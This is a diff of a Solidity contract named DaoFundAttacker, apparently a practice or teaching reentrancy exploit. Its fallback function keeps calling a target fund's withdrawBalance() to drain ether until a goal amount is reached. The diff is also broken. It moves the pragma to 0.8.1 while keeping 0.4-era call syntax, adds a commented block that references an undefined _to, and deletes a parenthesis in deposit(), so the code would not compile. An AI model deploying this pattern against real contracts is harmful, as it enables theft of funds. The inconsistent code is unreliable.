@@ -1,5 +1,5 @@
 // pragma solidity >=0.7.0 <0.9.0;
-pragma solidity ^0.4.18; 
+pragma solidity ^0.8.1; 
 
 contract DaoFundAttacker {
     address fundAddress;
@@ -12,9 +12,14 @@ contract DaoFundAttacker {
     }
 
     // function() public payable
-    fallback()external payable {
+    fallback() external payable {
         goalAmount -= int(msg.value);
+/*
+(bool sent, ) =  _to.call{value: msg.value, gas:1000}("");
+        require(sent, "failed");
+        emit howMuch(msg.value);
 
+ */
         if(goalAmount > 0) {
             if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))) {
                 emit WithdrawBalance("Succeeded in fallback", gasleft());
@@ -26,7 +31,7 @@ contract DaoFundAttacker {
     }
 
     function deposit() public payable {
-        if(fundAddress.call.value(msg.value).gas(gasleft()))
+        if(fundAddress.call.value(msg.value).gas(gasleft())
             (bytes4(keccak256("addToBalance()")))==false) {
             revert();
         }
